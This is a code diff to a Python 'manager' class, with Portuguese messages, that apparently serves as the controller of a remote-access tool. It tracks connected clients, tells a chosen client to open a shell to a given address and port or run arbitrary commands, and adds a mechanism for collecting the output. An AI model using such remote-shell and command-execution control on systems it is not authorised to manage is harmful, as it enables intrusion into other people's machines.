@@ -27,8 +27,9 @@ def decodeJwt(token):
 class manager:
     def __init__(self):
         self.clientList=collections.OrderedDict()
-        
-
+        self.result = ""
+        self.ok = False
+    
     def getClients(self):
         return self.clientList
 
@@ -46,12 +47,6 @@ class manager:
         print("getting gui",self.clientList[uid])
         return self.clientList[uid].getFile()
 
-    def report(self,uid,result):
-        print("reporting",uid,result)
-        self.clientList[uid].report(result) 
-
-    def getOK(self,uid):
-        self.clientList[uid].setOK=False
 
     ########################## actions RPC ############################
     def getClientByIndex(self,clientUid):
@@ -62,8 +57,7 @@ class manager:
             
     def displayClients(self):
         r ="displaying clients: \n"
-        #print("dict client:",self.clientList)
-        
+
         for i in range(len(self.clientList.items())):
             r+="cliente %i  = %s \n"%(i,self.getClientByIndex(i))
         
@@ -73,34 +67,38 @@ class manager:
         
         if (self.getClientByIndex(clientuid)):
             self.getClientByIndex(clientuid).openShell(addr,port)
+            return self.resulter()
         else:
             print("client don't find")
-
-
-    def executeProgram(self,fname,clientuid=0):
-        if (self.getClientByIndex(clientuid)):
-            self.getClientByIndex(clientuid).executeProgram(fname)
-            return "resposta"
-        else:
-            print("client don't find")
-            return "client don't find"
 
     def runCommand(self,cmd,clientuid=0):
         cmdList=[cmd]
         if (self.getClientByIndex(clientuid)):
             self.getClientByIndex(clientuid).runCommand(cmdList)
+            return self.resulter()
         else:
-            print("client don't find")
-            
-    
-    def testServer(self):
-        return "server ok"
+            return "client don't find"
     
     def testClient(self,clientuid=0):
         if (self.getClientByIndex(clientuid)):
             return self.getClientByIndex(clientuid).clientOK()
         else:
             return "client don't find"
+    
+    def report(self,input):
+        self.ok=True
+        self.result = input
+
+    def resulter(self):
+      time.sleep(1) #trocar pra 5
+      if self.ok==True:
+          self.ok=False
+          return self.result
+      else:
+          self.result = ""
+          return ""
+
+        
 
 
 
